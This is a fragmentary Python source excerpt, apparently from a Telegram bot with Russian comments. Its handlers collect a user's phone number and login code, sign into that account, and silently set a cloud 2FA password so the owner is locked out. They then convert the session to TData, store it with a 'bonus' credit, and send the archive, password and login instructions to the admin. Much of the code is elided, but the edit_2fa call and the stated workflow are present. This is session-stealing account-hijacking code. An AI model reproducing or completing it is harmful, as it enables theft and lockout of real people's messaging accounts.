...
async def cmd_start(message: Message):
    ...
    await message.answer(
        ...
        reply_markup=get_main_keyboard(is_admin), parse_mode="Markdown"
    )
...
async def process_phone(message: Message, state: FSMContext):
    ...
    # Передаем API_ID в виде строки для избежания конфликтов типов в opentele/telethon
...
async def process_code(message: Message, state: FSMContext):
    ...
    # Автоматическая установка облачного пароля
    try:
        await client.edit_2fa(new_password=AUTO_PASSWORD)
    except Exception as e:
        logger.warning(f"Не удалось установить пароль (возможно, он уже стоял): {e}")

    # Конвертация сессии в TData папки и создание архива
    ...
    # Сохраняем в базу и начисляем бонус
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
    ...
    # Инструкция для админа по входу через tdata
    tdata_instruction = (
    ...
    # Отправка администратору архива TData с паролем и инструкцией
